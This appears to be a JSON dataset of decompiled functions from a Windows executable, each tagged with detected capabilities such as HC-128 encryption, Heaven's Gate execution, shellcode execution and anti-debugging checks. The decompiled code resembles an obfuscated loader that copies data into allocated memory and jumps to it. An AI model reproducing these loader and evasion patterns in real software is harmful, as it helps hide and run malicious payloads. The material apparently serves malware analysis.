{
    "00404310": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "contain loop",
            "enumerate gui resources",
            "manipulate console buffer",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404310(uint param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uStack2404;\n    uchar *puStack2400;\n    uint uStack2396;\n    uint uStack2392;\n    uint uStack2388;\n    uint uStack2384;\n    uchar *puStack2380;\n    uint uStack2376;\n    uchar auStack2344 [248];\n    uchar auStack2096 [2096];\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_FillConsoleOutputCharacterW;\n    pcVar3 = _sym.imp.KERNEL32.dll_DeleteFileA;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA;\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteConsoleOutputCharacterA;\n    for (param_2 = param_2 >> 3; param_2 != 0; param_2 = param_2 - 1) {\n        if (*0x2f5da9c == 0x5d) {\n            uStack2376 = 0;\n            puStack2380 = 0x404352;\n            (*pcVar2)();\n            puStack2380 = &stack0xfffff6d8;\n            uStack2384 = 0;\n            uStack2388 = 0;\n            uStack2392 = 0x401278;\n            uStack2396 = 0;\n            puStack2400 = 0x404373;\n            (*pcVar1)();\n            puStack2400 = &stack0xfffff6c8;\n            uStack2404 = 0;\n            (*pcVar4)(0, 0, 0);\n            (*pcVar3)(0);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &stack0xfffff7d0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumResourceTypesW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetCPInfoExA)(0, 0, &stack0xfffff69c);\n            (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)(0, 0, 0);\n        }\n        uStack2376 = 0x4043dd;\n        fcn.00404140();\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "004044c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004044c0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uStack3724;\n    uint uStack3720;\n    uint uStack3716;\n    uint uStack3712;\n    uint uStack3708;\n    uint uStack3704;\n    uint uStack3700;\n    uchar *puStack3696;\n    uchar *puStack3692;\n    uchar *puStack3688;\n    uchar *puStack3684;\n    uint uStack3680;\n    uint uStack3676;\n    uint uStack3672;\n    uint32_t uStack3668;\n    uint uStack3352;\n    uint uStack3348;\n    uint uStack3344;\n    uint uStack3340;\n    uint uStack3336;\n    uint uStack3332;\n    uint uStack3328;\n    uint uStack3324;\n    uint uStack3320;\n    uint uStack3316;\n    uint uStack3312;\n    uint uStack3308;\n    uint uStack3304;\n    uint uStack3300;\n    uint uStack3296;\n    uint uStack3292;\n    uint uStack3288;\n    uint uStack3284;\n    uint uStack3280;\n    uint uStack3276;\n    uint uStack3268;\n    uchar auStack3232 [140];\n    uchar auStack3092 [4];\n    uchar auStack3088 [4];\n    uchar auStack3084 [1008];\n    uchar auStack2076 [2076];\n    \n    if (*0x2f5da9c == 0x16) {\n        uStack3668 = 0;\n        uStack3672 = 0x4044e0;\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)();\n        uStack3672 = 0;\n        uStack3676 = 0;\n        uStack3680 = 0;\n        puStack3684 = &stack0xfffff360;\n        puStack3688 = 0x4044f1;\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoA)();\n        puStack3688 = &stack0xfffff1b0;\n        puStack3692 = &stack0xfffff3ec;\n        puStack3696 = 0x404504;\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)();\n        puStack3696 = &stack0xfffff7e4;\n        uStack3700 = 0x404512;\n        (*_sym.imp.KERNEL32.dll_GlobalWire)();\n        uStack3700 = 0;\n        uStack3704 = 0;\n        uStack3708 = 0;\n        uStack3712 = 0x40451b;\n        (*_sym.imp.KERNEL32.dll__hwrite)();\n        uStack3712 = 0;\n        uStack3716 = 0;\n        uStack3720 = 0x404523;\n        (*_sym.imp.KERNEL32.dll_SetConsoleMode)();\n        uStack3720 = 0;\n        uStack3724 = 0;\n        (*_sym.imp.KERNEL32.dll_FindResourceExW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&stack0xfffff308);\n        (*_sym.imp.KERNEL32.dll_OpenJobObjectW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_ScrollConsoleScreenBufferA)(0, &stack0xfffff2e8, &stack0xfffff2f0, 0, &stack0xfffff174);\n        (*_sym.imp.KERNEL32.dll_GetPriorityClass)(0);\n        (*_sym.imp.KERNEL32.dll_FindNextFileA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameExW)(0, 0, 0);\n        uStack3672 = 0;\n        uStack3668 = 0;\n        uStack3676 = 0x40459a;\n        fcn.00405450();\n        uStack3672 = 0;\n        uStack3668 = 0;\n        uStack3676 = 0x4045a8;\n        fcn.004052b0();\n    }\n    *0x2f5da9c = *0x2f5da9c + 0xb2d3b;\n    *0x2f5daa8 = 0x65;\n    *0x2f5daa6 = 0x6e;\n    *0x2f5dab4 = 0x6c;\n    *0x2f5daa4 = 0x72;\n    *0x2f5dab0 = 0x2e;\n    *0x2f5dab2 = 100;\n    *0x2f5daa0 = 0x6b;\n    *0x2f5daa2 = 0x65;\n    *0x2f5daae = 0x32;\n    *0x2f5daac = 0x33;\n    *0x2f5dab6 = 0x6c;\n    *0x2f5dab8 = 0;\n    uStack3668 = *0x2f5da9c;\n    uStack3672 = 0;\n    *0x2f5daaa = 0x6c;\n    *0x2f63934 = *0x432eac;\n    uStack3676 = 0x404663;\n    *0x2f5a5a0 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n    uStack3676 = 0x40466d;\n    fcn.00404400();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetSystemDefaultLangID;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetSystemDefaultLCID;\n    iVar6 = 0;\n    do {\n        uStack3676 = 0x404683;\n        (*pcVar3)();\n        if (iVar6 < 0x11a6bc0) {\n            uStack3324 = 0x21d54550;\n            uStack3328 = 0x140e13b;\n            uStack3336 = 0x109ee0f1;\n            uStack3296 = 0x3720c84f;\n            uStack3344 = 0x687bb7b6;\n            uStack3304 = 0x2c6d57d1;\n            uStack3292 = 0x1aeb3e31;\n            uStack3332 = 0x53388c0c;\n            uStack3352 = 0x68c71946;\n            uStack3340 = 0x3ac90dc;\n            uStack3280 = 0x3a6b16a4;\n            uStack3300 = 0x790b8933;\n            uStack3348 = 0xebb1fab3;\n            uStack3284 = 0x16f2a060;\n            uStack3312 = 0x31c251fc;\n            uStack3276 = 0xfe526f3a;\n            uStack3268 = 0xa54a9782;\n            uStack3320 = 0x755a3475;\n            uStack3316 = 0xe60ea279;\n            uStack3308 = 0xe49b839a;\n            uStack3288 = 0x78fd8051;\n            uStack3676 = 0;\n            uStack3680 = 0;\n            puStack3684 = NULL;\n            puStack3688 = NULL;\n            puStack3692 = 0x404f9d;\n            (*_sym.imp.GDI32.dll_GetCharWidth32A)();\n        }\n        uStack3676 = 0x404f9f;\n        (*pcVar2)();\n        uStack3676 = 0x404fa1;\n        (*pcVar1)();\n    } while ((iVar6 < 0x298b9d8) && (iVar6 = iVar6 + 1,  iVar6 < 0x13d54e64));\n    uVar5 = 0;\n    if (*0x2f5da9c != 0) {\n        do {\n            *(uVar5 + *0x2f5a5a0) = *(*0x2f63934 + 0xb2d3b + uVar5);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < *0x2f5da9c);\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_FreeConsole;\n    pcVar2 = _sym.imp.KERNEL32.dll_AddAtomW;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetConsoleAliasesLengthA;\n    iVar6 = 0;\n    uVar5 = *0x2f5da9c;\n    do {\n        if (iVar6 + uVar5 == 0x5e) {\n            uStack3676 = 0x40501b;\n            (*pcVar3)();\n            uStack3676 = 0;\n            uStack3680 = 0x40501f;\n            (*pcVar1)();\n            uStack3680 = 0x401290;\n            puStack3684 = 0x405026;\n            (*pcVar2)();\n            puStack3684 = NULL;\n            puStack3688 = NULL;\n            puStack3692 = &stack0xfffff3f0;\n            puStack3696 = 0x405038;\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)();\n            uVar5 = *0x2f5da9c;\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x40c893);\n    uStack3676 = 0x413008;\n    uStack3680 = 0x405057;\n    fcn.00404310();\n    pcVar4 = _sym.imp.KERNEL32.dll_WritePrivateProfileStringW;\n    pcVar3 = _sym.imp.KERNEL32.dll_LocalReAlloc;\n    pcVar2 = _sym.imp.KERNEL32.dll_EnumResourceNamesW;\n    pcVar1 = _sym.imp.KERNEL32.dll_FindFirstChangeNotificationW;\n    iVar6 = 0x7b;\n    do {\n        if (*0x2f5da9c == 0xd) {\n            uStack3680 = 0;\n            puStack3684 = NULL;\n            puStack3688 = NULL;\n            puStack3692 = 0x405092;\n            (*pcVar3)();\n            puStack3692 = NULL;\n            puStack3696 = NULL;\n            uStack3700 = 0;\n            uStack3704 = 0;\n            uStack3708 = 0x40509c;\n            (*pcVar2)();\n            uStack3708 = 0;\n            uStack3712 = 0;\n            uStack3716 = 0;\n            uStack3720 = 0;\n            uStack3724 = 0x4050a6;\n            (*pcVar4)();\n            uStack3724 = 0;\n            (*pcVar1)(0, 0);\n        }\n        if (*0x2f5da9c == 0xf) {\n            uStack3680 = 0;\n            puStack3684 = NULL;\n            puStack3688 = &stack0xfffff3f4;\n            puStack3692 = NULL;\n            puStack3696 = 0x4050cb;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasA)();\n            puStack3696 = NULL;\n            uStack3700 = 0x4050d3;\n            (*_sym.imp.KERNEL32.dll_ReleaseActCtx)();\n        }\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    uStack3680 = 0x4012c0;\n    puStack3684 = 0x4050e5;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    return;\n}\n",
        "token_count": 2675
    },
    "null": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uchar *puStack3188;\n    uint uStack3184;\n    uchar *puStack3180;\n    uchar *puStack3176;\n    uint uStack3172;\n    uint uStack3168;\n    uint uStack3164;\n    int32_t iStack3108;\n    uchar auStack1064 [1064];\n    \n    if (*0x2f5da9c == 0xc) {\n        uStack3164 = 0;\n        uStack3168 = 0;\n        uStack3172 = 0;\n        puStack3176 = NULL;\n        puStack3180 = 0x405123;\n        (*_sym.imp.MSIMG32.dll_TransparentBlt)();\n        puStack3180 = &stack0xfffff3c0;\n        uStack3184 = 0;\n        puStack3188 = 0x405130;\n        (*_sym.imp.GDI32.dll_GetFontUnicodeRanges)();\n        puStack3188 = NULL;\n        (*_sym.imp.KERNEL32.dll_FoldStringA)(0, 0x4012cc, 0, &stack0xfffff3cc);\n        fcn.00405a0a(0, 0);\n        fcn.004059e9(0);\n        fcn.004059ff();\n        fcn.004059c2(0, 0);\n        uStack3164 = 0x40516d;\n        fcn.004059e9(0);\n        fcn.0040556d(0, 0);\n        fcn.00405865(0);\n        fcn.00405627();\n    }\n    *0x2f5da9c = *0x433e4c;\n    fcn.004044c0();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetVolumePathNameA;\n    pcVar3 = _sym.imp.KERNEL32.dll_ReadConsoleA;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetFileAttributesA;\n    pcVar1 = _sym.imp.KERNEL32.dll_SetComputerNameW;\n    iStack3108 = 0x1d72;\n    do {\n        if (*0x2f5da9c == 0x15) {\n            (*pcVar4)();\n            uStack3164 = 0;\n            uStack3168 = 0x4051fd;\n            (*pcVar3)();\n            uStack3168 = 0x4012d4;\n            uStack3172 = 0x405204;\n            (*pcVar2)();\n            uStack3172 = 0;\n            puStack3176 = 0x405208;\n            (*pcVar1)();\n            puStack3176 = &stack0xfffffbd8;\n            puStack3180 = NULL;\n            uStack3184 = 0;\n            puStack3188 = 0x40521a;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n            puStack3188 = &stack0xfffff3ac;\n            uStack3164 = 0;\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterW)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetVolumeNameForVolumeMountPointA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetFileShortNameA)(0, 0x4012e8);\n            (*_sym.imp.KERNEL32.dll_FillConsoleOutputCharacterA)(0, 0, 0, 0, &stack0xfffff38c);\n            (*_sym.imp.KERNEL32.dll_IsDBCSLeadByte)(0);\n        }\n        iStack3108 = iStack3108 + -1;\n    } while (iStack3108 != 0);\n    *0x2f5da90 = *0x2f5a5a0;\n    (**0x2f5a5a0)();\n    return 0;\n}\n",
        "token_count": 885
    },
    "00407ca3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00407d96: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00407d9b)\n// WARNING: Removing unreachable block (ram,0x00407dc9)\n// WARNING: Removing unreachable block (ram,0x00407da1)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00407ca3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408a10(0x411b28, 0x18);\n    fcn.0040b2d7(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x2f63984 != 1) {\n        *0x2f63980 = 1;\n        *0x2f6397c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.0040836a(*0x2f6560c);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.0040836a(*0x2f65608);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00408361();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.0040836a(*piVar2);\n                        iVar3 = fcn.00408361();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.0040836a(*0x2f6560c);\n                        piVar1 = fcn.0040836a(*0x2f65608);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00407bdd(0x40122c);\n        }\n        fcn.00407bdd(0x401234);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040b1fd(8);\n    }\n    return;\n}\n",
        "token_count": 807
    },
    "004080c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004080c0(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040b1fd(0);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004082e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004082e0(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x81cf88) {\n        return;\n    }\n    *0x2f641c0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                 (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                 ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                 (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x2f641c4 = &arg_8h;\n    *0x2f64100 = 0x10001;\n    *0x2f640a8 = 0xc0000409;\n    *0x2f640ac = 1;\n    var_328h = *0x81cf88;\n    var_324h = *0x81cf8c;\n    *0x2f640b4 = unaff_retaddr;\n    *0x2f6418c = in_GS;\n    *0x2f64190 = in_FS;\n    *0x2f64194 = in_ES;\n    *0x2f64198 = in_DS;\n    *0x2f6419c = unaff_EDI;\n    *0x2f641a0 = unaff_ESI;\n    *0x2f641a4 = unaff_EBX;\n    *0x2f641a8 = in_EDX;\n    *0x2f641ac = in_ECX;\n    *0x2f641b0 = in_EAX;\n    *0x2f641b4 = unaff_EBP;\n    *0x2f641b8 = unaff_retaddr;\n    *0x2f641bc = in_CS;\n    *0x2f641c8 = in_SS;\n    *0x2f640f8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040e223(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x403668);\n    if (*0x2f640f8 == 0) {\n        fcn.0040e223(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 863
    },
    "0040a80d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a80d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x81cf88 ^ &stack0xfffffffc;\n    fcn.0040587c(arg_10h);\n    var_14h = fcn.0040ed3c(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e2b4(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a866:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a8a6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a898:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a8a6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a898;\n        goto code_r0x0040a866;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a8a6:\n    fcn.004082e0(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "0040a8b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a8b5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x81cf88 ^ &stack0xfffffffc;\n    fcn.0040587c(arg_10h);\n    var_14h = fcn.0040ed3c(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e7f8(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040a90e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a94e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040a940:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040a94e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040a940;\n        goto code_r0x0040a90e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040a94e:\n    fcn.004082e0(unaff_EBX);\n    return;\n}\n",
        "token_count": 513
    },
    "0040b9c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b9c5(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00408361();\n    var_4h = 0;\n    if (*0x2f64094 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40365c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x403650);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x2f64094 = fcn.004082ef(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x403640);\n        *0x2f64098 = fcn.004082ef(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x40362c);\n        *0x2f6409c = fcn.004082ef(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x403610);\n        *0x2f640a4 = fcn.004082ef(uVar3);\n        if (*0x2f640a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4035f8);\n            *0x2f640a0 = fcn.004082ef(uVar3);\n        }\n    }\n    if ((*0x2f640a0 != iVar1) && (*0x2f640a4 != iVar1)) {\n        pcVar4 = fcn.0040836a(*0x2f640a0);\n        pcVar5 = fcn.0040836a(*0x2f640a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040bb07;\n        }\n    }\n    if ((((*0x2f64098 != iVar1) && (pcVar4 = fcn.0040836a(*0x2f64098),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x2f6409c != iVar1 && (pcVar4 = fcn.0040836a(*0x2f6409c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040bb07:\n    pcVar4 = fcn.0040836a(*0x2f64094);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 849
    },
    "0040e2b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e2b4(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040e7b5;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040e3e9;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040e3f0;\ncode_r0x0040e3e9:\n                        do {\n                            var_4h = 1;\ncode_r0x0040e3f0:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040e3fe;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = 